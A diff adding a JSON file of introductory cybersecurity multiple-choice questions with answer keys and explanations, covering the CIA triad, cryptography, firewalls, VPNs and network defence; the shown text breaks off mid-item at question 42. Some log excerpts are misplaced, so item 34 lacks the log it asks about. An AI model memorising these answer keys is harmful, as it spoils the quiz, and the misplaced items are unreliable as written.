@@ -1,0 +1,4325 @@
+[
+    {
+        "id": 1,
+        "question": "(Conceptual) An attacker launches a DDoS attack, overwhelming a server and making it unavailable to legitimate users. Which pillar of the CIA Triad has been violated?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Confidentiality"
+            },
+            {
+                "label": "B",
+                "text": "Integrity"
+            },
+            {
+                "label": "C",
+                "text": "Availability"
+            },
+            {
+                "label": "D",
+                "text": "Authentication"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Availability ensures that systems and data are accessible when needed. A DDoS attack\ndirectly targets this by making a service unusable.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 2,
+        "question": "(Scenario-Based) An employee with access to the HR database is given a new role in marketing. Their old HR access is never revoked. This is a violation of:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Separation of Duties"
+            },
+            {
+                "label": "B",
+                "text": "Principle of Least Privilege (PoLP)"
+            },
+            {
+                "label": "C",
+                "text": "Defense in Depth"
+            },
+            {
+                "label": "D",
+                "text": "Auditing"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "PoLP requires that users only have the permissions absolutely necessary for their current job\nrole. Failing to remove old permissions (\"Privilege Creep\") creates a security risk.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 3,
+        "question": "(Comparison) What is the difference between a Threat and a Vulnerability?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A Threat is always internal; a Vulnerability is external."
+            },
+            {
+                "label": "B",
+                "text": "A Vulnerability is a weakness; a Threat is an actor or event that could exploit that weakness."
+            },
+            {
+                "label": "C",
+                "text": "A Vulnerability is a risk; a Threat is a plan."
+            },
+            {
+                "label": "D",
+                "text": "They are the same thing."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "An unpatched server has a vulnerability. A hacker trying to break into that server is a threat.\nSecurity is the practice of fixing the vulnerability before the threat can act on it.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 4,
+        "question": "(Conceptual) The principle of \"Defense in Depth\" suggests that:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Security should only focus on the most valuable assets."
+            },
+            {
+                "label": "B",
+                "text": "Security should be implemented in multiple layers, assuming that any single layer can fail."
+            },
+            {
+                "label": "C",
+                "text": "Only physical security is important."
+            },
+            {
+                "label": "D",
+                "text": "Once a firewall is installed, the network is secure."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Defense in Depth is a layered strategy. If an attacker gets past the firewall (Layer 1), they still\nhave to deal with the server's OS security (Layer 2), the application's authentication (Layer 3),\nand database encryption (Layer 4).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 5,
+        "question": "(Scenario-Based) A bank's ATM system must ensure that a withdrawal deducts the correct amount from the account balance and does not change any other data. This is a requirement for:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Confidentiality"
+            },
+            {
+                "label": "B",
+                "text": "Integrity"
+            },
+            {
+                "label": "C",
+                "text": "Availability"
+            },
+            {
+                "label": "D",
+                "text": "Non-repudiation"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Integrity ensures the accuracy and trustworthiness of data. Unauthorized or incorrect\nmodification of data is a breach of integrity.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 6,
+        "question": "(Code/Logic) A security analyst is looking at a server's access log. What process is being performed here?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Authentication"
+            },
+            {
+                "label": "B",
+                "text": "Authorization"
+            },
+            {
+                "label": "C",
+                "text": "Auditing"
+            },
+            {
+                "label": "D",
+                "text": "Encryption"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Auditing is the process of reviewing logs to determine \"who did what, and when.\" It is crucial\nfor accountability and forensic analysis.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 7,
+        "question": "(Conceptual) What does \"Non-repudiation\" guarantee?",
+        "options": [
+            {
+                "label": "A",
+                "text": "That the data is encrypted."
+            },
+            {
+                "label": "B",
+                "text": "That a sender cannot deny having sent a message and a receiver cannot deny having received it."
+            },
+            {
+                "label": "C",
+                "text": "That the server will always be online."
+            },
+            {
+                "label": "D",
+                "text": "That the user can change their password."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Non-repudiation is typically achieved through digital signatures. It provides undeniable proof of\nan action, which is essential for legal and financial transactions.\nauth.log\n[2024-05-15] User 'admin' deleted file '/etc/config.sh'\n[2024-05-15] User 'guest' accessed '/home/guest/docs'",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 8,
+        "question": "(Conceptual) The sum of all points where an attacker can try to enter or extract data from a system is known as the:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Threat Vector"
+            },
+            {
+                "label": "B",
+                "text": "Attack Surface"
+            },
+            {
+                "label": "C",
+                "text": "Security Posture"
+            },
+            {
+                "label": "D",
+                "text": "Risk Exposure"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A small attack surface (e.g., only one open port) is much easier to defend than a large one\n(e.g., many open ports, complex APIs, and user-facing forms).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 9,
+        "question": "(Comparison) What is the difference between Authentication and Authorization?",
+        "options": [
+            {
+                "label": "A",
+                "text": "AuthN checks what you can do; AuthZ checks who you are."
+            },
+            {
+                "label": "B",
+                "text": "AuthN verifies your identity; AuthZ determines your access rights."
+            },
+            {
+                "label": "C",
+                "text": "AuthN is for networks; AuthZ is for applications."
+            },
+            {
+                "label": "D",
+                "text": "AuthZ happens before AuthN."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Logging in is Authentication. Being allowed to see the \"Admin\" page after logging in is\nAuthorization.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 10,
+        "question": "(Conceptual) Which of these is a form of \"Social Engineering\"?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A DDoS attack."
+            },
+            {
+                "label": "B",
+                "text": "An attacker phoning an employee and pretending to be from IT to get their password."
+            },
+            {
+                "label": "C",
+                "text": "A SQL Injection attack."
+            },
+            {
+                "label": "D",
+                "text": "A buffer overflow."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Social engineering attacks exploit human psychology rather than technical vulnerabilities.\nPhishing and pretexting are common examples.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 11,
+        "question": "(Scenario-Based) An attacker intercepts a bank transfer and changes the destination account number. This is a violation of:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Confidentiality"
+            },
+            {
+                "label": "B",
+                "text": "Integrity"
+            },
+            {
+                "label": "C",
+                "text": "Availability"
+            },
+            {
+                "label": "D",
+                "text": "Plausible Deniability"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Integrity is violated because the data was modified in transit by an unauthorized party.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 12,
+        "question": "(Conceptual) In security, what is a \"Zero-Day\" vulnerability?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A vulnerability that is very easy to fix."
+            },
+            {
+                "label": "B",
+                "text": "A vulnerability that is known to the attacker but not yet known to the vendor or the public."
+            },
+            {
+                "label": "C",
+                "text": "A vulnerability that only works on the first day of the month."
+            },
+            {
+                "label": "D",
+                "text": "A vulnerability that takes zero skill to exploit."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "It is called \"zero-day\" because the developers have had zero days to create a patch for it,\nmaking it extremely dangerous.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 13,
+        "question": "(Conceptual) What is the purpose of an Asset Inventory in security?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To count the number of employees."
+            },
+            {
+                "label": "B",
+                "text": "To know what you are trying to protect (hardware, software, data)."
+            },
+            {
+                "label": "C",
+                "text": "To manage the company's finances."
+            },
+            {
+                "label": "D",
+                "text": "To test network speed."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "\"You can't protect what you don't know you have.\" An asset inventory is the foundational first\nstep of any security program.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 14,
+        "question": "(Conceptual) What is a \"Man-in-the-Middle\" (MITM) attack?",
+        "options": [
+            {
+                "label": "A",
+                "text": "An attack on a server's memory."
+            },
+            {
+                "label": "B",
+                "text": "An attack where the attacker secretly relays and possibly alters the communication between two parties."
+            },
+            {
+                "label": "C",
+                "text": "An attack that requires physical access to the server."
+            },
+            {
+                "label": "D",
+                "text": "A type of phishing email."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "In a MITM attack, the victim thinks they are talking directly to the server, but they are actually\ntalking to the attacker, who is then talking to the server. HTTPS is the primary defense against\nthis.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 15,
+        "question": "(Conceptual) Which of these is an example of \"Security through Obscurity\"?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Encrypting all data with AES-256."
+            },
+            {
+                "label": "B",
+                "text": "Requiring multi-factor authentication."
+            },
+            {
+                "label": "C",
+                "text": "Hiding a configuration file in a strange folder and hoping no one finds it."
+            },
+            {
+                "label": "D",
+                "text": "Using a firewall to block all incoming traffic."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Security through Obscurity is a weak strategy because it relies on secrecy. Real security\nshould assume the attacker knows everything about the system's design and still cannot\nbreak it.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 16,
+        "question": "(Conceptual) What is the main advantage of Asymmetric Encryption over Symmetric Encryption?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It is significantly faster."
+            },
+            {
+                "label": "B",
+                "text": "It solves the key distribution problem, as the public key can be shared openly."
+            },
+            {
+                "label": "C",
+                "text": "It uses a single key for both encryption and decryption."
+            },
+            {
+                "label": "D",
+                "text": "It cannot be broken by quantum computers."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "In symmetric encryption, you must find a secure way to share the secret key with the other\nparty. In asymmetric, you can post your public key on a website, and anyone can use it to\nsend you encrypted data that only you can decrypt with your private key.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 17,
+        "question": "(Scenario-Based) An application stores user passwords in a database. What is the most secure method for this?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Store them as plain text."
+            },
+            {
+                "label": "B",
+                "text": "Encrypt them with AES."
+            },
+            {
+                "label": "C",
+                "text": "Hash them with a salted, slow algorithm like bcrypt or Argon2."
+            },
+            {
+                "label": "D",
+                "text": "Encrypt them with RSA."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "You should never need to \"decrypt\" a user's password. You only need to verify it. By hashing\nthe password, you store a one-way fingerprint. A slow, salted hash prevents brute-force and\nrainbow table attacks.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 18,
+        "question": "(Code/Logic) A developer is creating a Digital Signature. What is the correct sequence of operations?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Encrypt the message with the recipient's public key."
+            },
+            {
+                "label": "B",
+                "text": "Hash the message, then encrypt the hash with the sender's private key."
+            },
+            {
+                "label": "C",
+                "text": "Hash the message, then encrypt the hash with the recipient's public key."
+            },
+            {
+                "label": "D",
+                "text": "Encrypt the entire message with the sender's private key."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Encrypting the hash (not the full message) is efficient. Using the sender's private key ensures\nthat only the sender could have created it (Authentication/Non-repudiation).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 19,
+        "question": "(Conceptual) In a Hybrid Encryption system (like TLS/SSL), how are symmetric and asymmetric keys used?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Symmetric is for authentication; Asymmetric for speed."
+            },
+            {
+                "label": "B",
+                "text": "Asymmetric encryption is used to securely exchange a symmetric \"session key,\" which is then used to encrypt the bulk data."
+            },
+            {
+                "label": "C",
+                "text": "Only Asymmetric is used."
+            },
+            {
+                "label": "D",
+                "text": "Only Symmetric is used."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "This gets the best of both worlds. The slow Asymmetric crypto is used only once (to share the\nkey safely), and the fast Symmetric crypto is used for the actual high-volume data transfer.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 20,
+        "question": "(Conceptual) Which of the following is a key property of a cryptographic Hash Function?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It is reversible (can be un-hashed)."
+            },
+            {
+                "label": "B",
+                "text": "It is deterministic (the same input always produces the same output)."
+            },
+            {
+                "label": "C",
+                "text": "It produces a variable-length output."
+            },
+            {
+                "label": "D",
+                "text": "It requires a secret key to compute."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A hash function must be deterministic. If hashing \"hello\" produced a different result every time,\nit would be impossible to use it for verification.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 21,
+        "question": "(Code-Tracing) A system uses AES-256 for encryption. What does the \"256\" refer to?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The number of rounds of encryption."
+            },
+            {
+                "label": "B",
+                "text": "The block size in bytes."
+            },
+            {
+                "label": "C",
+                "text": "The key size in bits."
+            },
+            {
+                "label": "D",
+                "text": "The speed of the algorithm in MB/s."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "AES can use key sizes of 128, 192, or 256 bits. A longer key provides a higher level of\nsecurity against brute-force attacks.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 22,
+        "question": "(Conceptual) What is a \"Salt\" in the context of password hashing?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A seasoning for food."
+            },
+            {
+                "label": "B",
+                "text": "A random string appended to a password before hashing to prevent rainbow table attacks."
+            },
+            {
+                "label": "C",
+                "text": "The username of the user."
+            },
+            {
+                "label": "D",
+                "text": "A second, backup password."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If two users have the same password \"12345\", adding a unique salt to each (e.g.,\n\"12345saltA\" and \"12345saltB\") ensures that their final stored hashes are completely different.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 23,
+        "question": "(Scenario-Based) A user wants to verify that a downloaded software file has not been tampered with. The website provides an SHA-256 hash of the original file. What should the user do?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Encrypt the downloaded file with SHA-256."
+            },
+            {
+                "label": "B",
+                "text": "Compute the SHA-256 hash of their downloaded file and compare it to the one on the website."
+            },
+            {
+                "label": "C",
+                "text": "Ignore the hash as it is for developers only."
+            },
+            {
+                "label": "D",
+                "text": "Email the hash to the company."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "This is the classic use case for hashing: integrity verification. If the hashes match, the user\ncan be confident the file is identical to the original.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 24,
+        "question": "(Comparison) What is the main difference between Stream Ciphers and Block Ciphers?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Stream ciphers are only for video."
+            },
+            {
+                "label": "B",
+                "text": "Stream ciphers encrypt data one bit or byte at a time; Block ciphers operate on fixed-size blocks of data."
+            },
+            {
+                "label": "C",
+                "text": "Block ciphers are always faster."
+            },
+            {
+                "label": "D",
+                "text": "Stream ciphers do not use a key."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "RC4 is a classic stream cipher; AES is a classic block cipher. Stream ciphers are often used\nfor real-time communication, while block ciphers are used for file encryption.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 25,
+        "question": "(Conceptual) What does a Certificate Authority (CA) do?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It writes encryption algorithms."
+            },
+            {
+                "label": "B",
+                "text": "It acts as a trusted third party that verifies the identity of a website and issues digital certificates (for HTTPS)."
+            },
+            {
+                "label": "C",
+                "text": "It manages the DNS root servers."
+            },
+            {
+                "label": "D",
+                "text": "It sells usernames and passwords."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Your browser trusts CAs (like Let's Encrypt). When you visit a site, it presents a certificate\nsigned by a CA. Your browser verifies the signature to ensure you are talking to the real site,\nnot an imposter.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 26,
+        "question": "(Conceptual) In a public key system, if Bob wants to send a confidential message to Alice, he should encrypt it with:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Bob's Public Key"
+            },
+            {
+                "label": "B",
+                "text": "Bob's Private Key"
+            },
+            {
+                "label": "C",
+                "text": "Alice's Public Key"
+            },
+            {
+                "label": "D",
+                "text": "Alice's Private Key"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Data encrypted with a public key can only be decrypted by the corresponding private key.\nSince only Alice has her private key, she is the only one who can read the message.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 27,
+        "question": "(Conceptual) What is \"Collision Resistance\" in a hash function?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The ability to produce the same hash for different inputs."
+            },
+            {
+                "label": "B",
+                "text": "It should be computationally infeasible to find two different inputs that produce the same hash output."
+            },
+            {
+                "label": "C",
+                "text": "The hash function is very fast."
+            },
+            {
+                "label": "D",
+                "text": "The hash output is very long."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If an attacker can create a collision, they could create a malicious file that has the same hash\nas a legitimate file, allowing them to bypass integrity checks.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 28,
+        "question": "(Conceptual) What is Kerckhoffs's Principle?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A cryptosystem should be easy to remember."
+            },
+            {
+                "label": "B",
+                "text": "A cryptosystem should be secure even if everything about the system, except the key, is public knowledge."
+            },
+            {
+                "label": "C",
+                "text": "The key should be very long."
+            },
+            {
+                "label": "D",
+                "text": "The algorithm should be patented."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "This is the opposite of \"Security by Obscurity.\" It states that the security of a system must rely\non the secrecy of the key, not the secrecy of the algorithm.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 29,
+        "question": "(Scenario-Based) An attacker has a list of password hashes. They pre-compute hashes for all common passwords (like '123456', 'password'). What is this attack called?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Brute-Force Attack"
+            },
+            {
+                "label": "B",
+                "text": "Rainbow Table Attack"
+            },
+            {
+                "label": "C",
+                "text": "Social Engineering Attack"
+            },
+            {
+                "label": "D",
+                "text": "Denial of Service Attack"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A rainbow table is a lookup table. The attacker just looks up the stolen hash and finds the\ncorresponding plaintext password. Salting is the primary defense against this.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 30,
+        "question": "(Conceptual) The process of using a public key to verify that a message was signed with the corresponding private key provides:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Confidentiality only."
+            },
+            {
+                "label": "B",
+                "text": "Authentication and Non-repudiation."
+            },
+            {
+                "label": "C",
+                "text": "Availability only."
+            },
+            {
+                "label": "D",
+                "text": "Data compression."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If you can decrypt the signature with the public key, it proves that the message could only\nhave come from the person who holds the private key (Authentication) and they cannot deny\nsending it (Non-repudiation).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 31,
+        "question": "(Conceptual) Which type of firewall is specifically designed to understand and filter traffic based on specific web-based attacks like Cross-Site Scripting (XSS) and SQL Injection?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Packet Filtering Firewall"
+            },
+            {
+                "label": "B",
+                "text": "Stateful Inspection Firewall"
+            },
+            {
+                "label": "C",
+                "text": "Web Application Firewall (WAF)"
+            },
+            {
+                "label": "D",
+                "text": "Circuit-Level Gateway"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "A WAF operates at the Application Layer (Layer 7). Unlike traditional firewalls that look at IPs\nand ports, a WAF looks at the actual HTML/HTTP content to find malicious patterns.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 32,
+        "question": "(Scenario-Based) An organization wants to connect its branch office in Karachi to its main office in Islamabad over the public internet while ensuring all data remains confidential. Which technology is required?",
+        "options": [
+            {
+                "label": "A",
+                "text": "An open Proxy server"
+            },
+            {
+                "label": "B",
+                "text": "A Layer 2 Switch"
+            },
+            {
+                "label": "C",
+                "text": "An IPsec VPN"
+            },
+            {
+                "label": "D",
+                "text": "A VLAN"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "IPsec (Internet Protocol Security) is the industry standard for creating \"Site-to-Site\" VPNs,\nproviding encryption and authentication for all traffic between two network gateways.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 33,
+        "question": "(Conceptual) In a standard network architecture, where should a Public Web Server be placed to minimize risk to the internal corporate database?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Directly on the internal LAN."
+            },
+            {
+                "label": "B",
+                "text": "Inside a DMZ (Demilitarized Zone)."
+            },
+            {
+                "label": "C",
+                "text": "Outside the external firewall."
+            },
+            {
+                "label": "D",
+                "text": "On a private cloud with no internet access."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A DMZ isolates public-facing services. If the web server is hacked, the attacker is still\nseparated from the sensitive internal network by another firewall layer.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 34,
+        "question": "(Code/Logic) A network admin views the following firewall log entry. What is the most likely activity being performed by the source IP?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A successful DDoS attack."
+            },
+            {
+                "label": "B",
+                "text": "Port Scanning / Reconnaissance."
+            },
+            {
+                "label": "C",
+                "text": "A SQL Injection attempt."
+            },
+            {
+                "label": "D",
+                "text": "A VPN connection request."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The log shows a single source IP attempting to connect to multiple sequential ports (21, 22,\n23) on a single destination. This is a classic \"Port Scan\" used to find which services are open/\nvulnerable.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 35,
+        "question": "(Conceptual) What is the primary functional difference between an IDS and an IPS? firewall.log SRC: 192.168.1.50 DEST: 10.0.0.5 PORT: 21 [REJECT] SRC: 192.168.1.50 DEST: 10.0.0.5 PORT: 22 [REJECT] SRC: 192.168.1.50 DEST: 10.0.0.5 PORT: 23 [REJECT] SRC: 192.168.1.50 DEST: 10.0.0.5 PORT: 80 [ACCEPT]",
+        "options": [
+            {
+                "label": "A",
+                "text": "IDS is hardware; IPS is software."
+            },
+            {
+                "label": "B",
+                "text": "IDS is for external threats; IPS is for internal threats."
+            },
+            {
+                "label": "C",
+                "text": "IDS only detects and alerts on suspicious activity; IPS detects and automatically takes action to block the activity."
+            },
+            {
+                "label": "D",
+                "text": "IDS is faster than IPS."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Intrusion Detection (IDS) is out-of-band (passive); Intrusion Prevention (IPS) is in-line (active),\nmeaning traffic must pass through it, allowing it to drop malicious packets in real-time.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 36,
+        "question": "(Scenario-Based) A company sets up a Honeypot. What is the primary purpose of this system?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To host the company's production database."
+            },
+            {
+                "label": "B",
+                "text": "To act as a decoy system to lure attackers away from real assets and study their methods."
+            },
+            {
+                "label": "C",
+                "text": "To provide free Wi-Fi to guests."
+            },
+            {
+                "label": "D",
+                "text": "To speed up network routing."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A Honeypot has no legitimate business value. Any interaction with it is assumed to be\nmalicious, allowing security teams to gather intelligence on attacker behavior without risking\nreal data.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 37,
+        "question": "(Conceptual) Why is HTTPS necessary even if a user is connected to a \"Secure\" corporate VPN?",
+        "options": [
+            {
+                "label": "A",
+                "text": "VPNs do not support web traffic."
+            },
+            {
+                "label": "B",
+                "text": "HTTPS makes the images load faster."
+            },
+            {
+                "label": "C",
+                "text": "The VPN only encrypts the \"tunnel\" to the office; the traffic leaving the office to the internet is visible if not encrypted with HTTPS."
+            },
+            {
+                "label": "D",
+                "text": "VPNs only work on Layer 2."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Security requires \"End-to-End\" encryption. A VPN provides \"Point-to-Point\" encryption. Once\nthe data leaves the VPN gateway, it is vulnerable unless protected by its own application-layer\nencryption (HTTPS).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 38,
+        "question": "(Comparison) What is the difference between Unicast and Anycast from a security perspective during a DDoS attack?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Unicast is safer than Anycast."
+            },
+            {
+                "label": "B",
+                "text": "Anycast allows attack traffic to be distributed across multiple global nodes, whereas Unicast directs all attack traffic to a single target."
+            },
+            {
+                "label": "C",
+                "text": "Anycast is only for local networks."
+            },
+            {
+                "label": "D",
+                "text": "Unicast uses more power."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Anycast \"dilutes\" a DDoS attack. If a botnet in Asia attacks an Anycast IP, only the Asian node\nof the service is impacted, while the rest of the world remains unaffected.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 39,
+        "question": "(Conceptual) Which network security model operates on the principle of \"Never Trust, Always Verify\"?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Perimeter Defense"
+            },
+            {
+                "label": "B",
+                "text": "Walled Garden"
+            },
+            {
+                "label": "C",
+                "text": "Zero Trust Architecture"
+            },
+            {
+                "label": "D",
+                "text": "Open Systems Interconnect"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Zero Trust removes the concept of an \"internal trusted network.\" Every request for a resource\nmust be authenticated and authorized, regardless of where the request originates.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 40,
+        "question": "(Scenario-Based) An attacker uses ARP Spoofing to redirect traffic. At which OSI layer does this attack occur?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Physical Layer"
+            },
+            {
+                "label": "B",
+                "text": "Data Link Layer (Layer 2)"
+            },
+            {
+                "label": "C",
+                "text": "Network Layer (Layer 3)"
+            },
+            {
+                "label": "D",
+                "text": "Transport Layer (Layer 4)"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "ARP (Address Resolution Protocol) maps IPs to MAC addresses. Since MAC addresses are a\nLayer 2 concept, ARP spoofing is a Data Link layer attack.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 41,
+        "question": "(Conceptual) What does Network Segmentation achieve?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It makes the network cables shorter."
+            },
+            {
+                "label": "B",
+                "text": "It limits the \"Blast Radius\" of an attack by preventing an attacker from moving laterally between different parts of the network."
+            },
+            {
+                "label": "C",
+                "text": "It increases the total bandwidth of the ISP."
+            },
+            {
+                "label": "D",
+                "text": "It converts IPv4 to IPv6 automatically."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "By splitting the network (e.g., using VLANs), you ensure that a compromised laptop in the\n\"Marketing\" department cannot access the \"Server\" department without passing through a\ncontrolled gateway/firewall.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 42,
+        "question": "(Comparison) How does a Stateful Firewall handle a return packet from a website?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It blocks it by default."
+            },
+            {
+                "label": "B",
+                "text": "It checks its \"State Table\" to see if the packet is a response to an existing internal request and allows it if a match is found."
+            },
+            {
+                "label": "C",
+                "text": "It asks the administrator for permission."
+            },
+            {
+                "label": "D",
+                "text": "It only checks the destination IP."
+            }
+        ],
